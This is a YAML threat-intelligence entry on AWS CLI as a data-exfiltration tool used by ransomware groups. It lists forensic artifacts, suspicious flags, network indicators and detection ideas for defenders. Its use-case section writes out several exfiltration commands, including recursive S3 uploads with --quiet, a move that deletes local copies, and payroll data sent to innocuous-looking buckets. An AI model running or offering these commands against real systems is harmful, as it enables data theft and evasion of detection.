Name: AWS CLI
Description: >
  Official command-line tool from Amazon Web Services (AWS) used to manage AWS
  infrastructure. Supports file transfer to Simple Storage Service (S3) via cp, mv, and sync commands, as well as other
  storage services such as Relational Database Service (RDS) and has been abused for data exfiltration by ransomware
  groups.
Category: cloud-based
Platform:
  - Windows
  - Linux
  - macOS
Execution:
  - cli
Capabilities:
  - file-transfer
  - authenticated-upload
  - recursive-upload
  - quiet-execution
  - endpoint-spoofing
  - credentialed-access
  - anonymous-upload
  - background-execution
Forensics:
  BinaryLocations:
    - C:\Program Files\Amazon\AWSCLIV2\aws.exe
    - C:\Program Files (x86)\Amazon\AWSCLI\bin\aws.exe
    - USERPROFILE\AppData\Local\Programs\Python\Python39\Scripts\aws.exe
    - /usr/local/bin/aws
    - /usr/bin/aws
    - ~/.local/bin/aws
  FileNamePatterns:
    - aws.exe
    - aws
  CommandLineArgs:
    Description: These are the most common flags that have been observed to be used by threat actors in the wild.
    Indicators:
      - s3 cp
      - s3 mv
      - s3 sync
      - --recursive
      - --quiet
      - --endpoint-url
      - --exclude
      - --include
  NetworkArtifacts:
    Description: Detectable traffic patterns related to AWS CLI file transfers.
    Indicators:
      - '*.s3.amazonaws.com'
      - '*.s3.<region>.amazonaws.com'
      - 's3-accelerate.amazonaws.com'
  ConfigFiles:
    - C:\Users\<username>\.aws\credentials
    - ~/.aws/credentials
  RegistryPersistence: []
  LogFiles: []
  ScheduledTask: []
NetworkBehavior:
  Description: >
    AWS CLI performs authenticated HTTPS connections to AWS service endpoints, most commonly Amazon S3,
    using REST API calls signed with SigV4. During exfiltration abuse, attackers generate sustained outbound
    HTTPS traffic characterized by large byte counts, recursive object uploads, and optional use of custom
    or accelerated endpoints to evade domain-based detections.
  Behaviors:
    - HTTPS connections to S3 REST API endpoints over port 443
    - High-volume outbound data transfers during s3 cp or s3 sync operations
    - Recursive object enumeration followed by sequential uploads
    - Optional use of s3-accelerate or custom --endpoint-url destinations
    - Minimal interactive output when --quiet is used
ThreatActors:
  - ransomware
  - apt
UseCases:
  - Title: Basic directory exfiltration
    Description: Copies a full directory to an S3 bucket using the cp command with the --recursive flag.
    Command: aws s3 cp C:\Data s3://exfil-bucket/ --recursive
  - Title: Stealthy exfiltration with quiet mode
    Description: Executes a recursive file upload while suppressing all CLI output using --quiet.
    Command: aws s3 cp /tmp/data s3://bucket-name/ --recursive --quiet
  - Title: Exfiltration via custom or accelerated endpoint
    Description: Uses --endpoint-url to redirect uploads through a non-standard endpoint.
    Command: aws s3 cp data.txt https://malicious-s3[.]domain --endpoint-url
  - Title: Selective file exfiltration using filters
    Description: Uploads only targeted file types using --include and --exclude flags.
    Command: aws s3 cp /reports s3://leakdump/ --recursive --include "*.pdf" --exclude "*"
  - Title: Trace-removal via move operation
    Description: Transfers files using the mv command, removing local copies after upload.
    Command: aws s3 mv C:\Sensitive s3://hidden-bucket/ --recursive
  - Title: Full backup of compromised system
    Description: Synchronizes the entire user directory with a remote S3 bucket.
    Command: aws s3 sync C:\Users s3://backup-bucket/
  - Title: Obfuscation with benign bucket names
    Description: Uploads data to non-suspicious bucket names to blend with legitimate activity.
    Command: aws s3 cp C:\Payroll s3://finance-backups/ --recursive
Detection:
  - Type: Anomalous Endpoint Usage
    Description: >
      Detect AWS CLI connections to rarely used or non-default S3 endpoints such as s3-accelerate.amazonaws.com
      or custom S3-compatible domains.
  - Type: Command-Line Abuse
    Description: >
      Alert on suspicious use of --quiet, --recursive, --include, and --exclude flags, especially with mv.
  - Type: Suspicious Parent Process
    Description: >
      Detect AWS CLI execution from uncommon parent processes such as mshta, wmic, powershell, or winword.
  - Type: Credential Misuse + Exfil Behavior
    Description: >
      Correlate AWS CLI usage with credential access events or suspicious archive creation.
  - Type: Snapshot Abuse via AWS CLI
    Description: >
      Monitor snapshot creation or backup activity linked to credential misuse.
    Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/cloud/aws/cloudtrail/aws_snapshot_backup_exfiltration.yml
References:
  - https://thedfirreport.com/2022/10/17/icedid-to-dagon-ransomware/
  - https://hackingthe.cloud/aws/post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/
  - https://docs.aws.amazon.com/cli/latest/reference/s3/
LastModified: '2025-12-12'
